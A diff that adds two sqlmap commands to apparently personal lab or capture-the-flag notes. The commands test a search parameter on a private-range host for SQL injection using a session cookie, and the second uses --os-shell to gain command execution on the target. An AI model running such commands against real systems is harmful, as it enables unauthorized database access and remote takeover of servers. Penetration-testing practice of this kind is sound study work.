@@ -1,0 +1,2 @@
+* sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"
+* sqlmap.py -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=ar5e1hl675kusjcckrrdgq8kq0" --os-shell
